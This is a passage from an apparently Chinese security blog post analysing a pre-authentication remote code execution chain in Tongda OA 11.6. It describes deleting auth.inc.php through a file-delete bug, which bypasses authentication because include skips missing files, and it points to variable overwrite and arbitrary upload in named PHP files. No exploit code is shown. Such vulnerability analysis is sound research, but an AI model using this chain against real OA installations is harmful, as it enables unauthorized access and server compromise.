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" alt="img"></h3><p>能将传入的guid传入的文件删除</p>
<h1 id="身份绕过"><a href="#身份绕过" class="headerlink" title="身份绕过"></a>身份绕过</h1><p>删文件某些时候可以删除一些认证的文件，进行文件的绕过</p>
<p><img src="data:image/png;base64,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" alt="img"></p>
<p>这里呢，简单来讲就是把auth.inc.php给包含进来，如果没有对应session的话，auth.inc.php就会作为“拦路虎”，让用户去登陆，但是删掉会怎么样？</p>
<p>这里就要看php里面include和require的区别了</p>
<p>这两个东西看起来很相似,都是包含嘛，但是稍稍学过洋文的都知道，include的意思指的是包含，而require却有要求的意思，在这里就可以看出点区别了。</p>
<p>如果要包含的文件找不着，include就索性跳过去了，而require是要求，感觉更加强烈一些，找不着文件就fatal error停止不前了。</p>
<p>而恰巧通达OA里面用的都是include，于是如果发现auth.inc.php失踪了，就会直接跳过去!</p>
<p>因此我们只需要利用前面的漏洞，删掉auth.inc.php，即可跳过通达OA里面大部分身份验证！</p>
<p> 其中的代码验证SESSION判断是否登录</p>
<h1 id="变量覆盖和任意文件上传"><a href="#变量覆盖和任意文件上传" class="headerlink" title="变量覆盖和任意文件上传"></a>变量覆盖和任意文件上传</h1><p>这里我们看到general/data_center/utils/upload.php</p>
<p>这前面包含的header.inc.php会将$_REQUEST中的所有东西注册成变量</p>
<p>（没找到大佬说的位置）</p>
<p><img src="/2020/09/09/web%E6%B8%97%E9%80%8F/%E9%80%9A%E8%BE%BEOA11-6-preAuth-RCE%E5%88%86%E6%9E%90/getImage-20200909162931818.png" alt="img"></p>
